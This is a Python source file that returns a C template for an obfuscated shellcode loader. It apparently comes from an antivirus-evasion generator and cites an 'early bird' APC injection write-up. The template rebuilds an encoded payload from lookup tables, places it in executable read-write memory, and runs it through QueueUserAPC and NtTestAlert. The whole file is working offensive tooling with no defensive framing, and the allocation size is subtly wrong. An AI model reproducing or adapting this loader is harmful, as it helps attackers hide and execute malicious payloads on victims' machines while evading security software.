###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/early-bird"
def get():
    c_code = '''
#include <windows.h>
#include <stdio.h>

typedef VOID(NTAPI* pNtTestAlert)(VOID);
<TABLES>
int main() {
	PCHAR lpBuffer = <ALLOC>

	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}
	
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
	LPVOID lpBaseAddress = VirtualAlloc(NULL, sizeof(lpBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lpBaseAddress, lpBuffer, sizeof(offset_table));
	QueueUserAPC((PAPCFUNC)lpBaseAddress, GetCurrentThread(), NULL);
	
	NtTestAlert();
	return 0;
}
    '''
    return c_code

